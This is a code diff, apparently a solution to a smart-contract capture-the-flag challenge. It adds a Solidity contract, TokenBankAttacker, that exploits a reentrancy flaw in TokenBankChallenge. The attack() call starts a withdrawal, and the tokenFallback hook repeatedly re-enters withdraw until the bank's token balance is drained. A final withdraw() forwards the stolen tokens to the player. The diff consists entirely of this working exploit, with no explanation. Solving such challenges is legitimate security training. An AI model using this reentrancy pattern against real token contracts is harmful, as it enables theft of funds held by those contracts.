@@ -124,3 +124,35 @@ contract TokenBankChallenge {
         balanceOf[msg.sender] -= amount;
     }
 }
+
+contract TokenBankAttacker is ITokenReceiver {
+    TokenBankChallenge public bank;
+    SimpleERC223Token public token;
+    address public player;
+    
+    function TokenBankAttacker(address _bank) public {
+        bank = TokenBankChallenge(_bank);
+        token = SimpleERC223Token(bank.token());
+        player = msg.sender;
+    }
+    
+    function attack() external {
+        uint256 amount = 500000 * 10**18;
+        bank.withdraw(amount);
+        token.transfer(address(bank), amount);
+    }
+    
+    function tokenFallback(address from, uint256 value, bytes) external {
+        if (from == address(bank)) {
+            if (token.balanceOf(address(bank)) > 0) {
+                bank.withdraw(value);
+            }
+        }
+    }
+    
+    function withdraw() external {
+        require(msg.sender == player);
+        uint256 balance = token.balanceOf(address(this));
+        require(token.transfer(player, balance));
+    }
+}
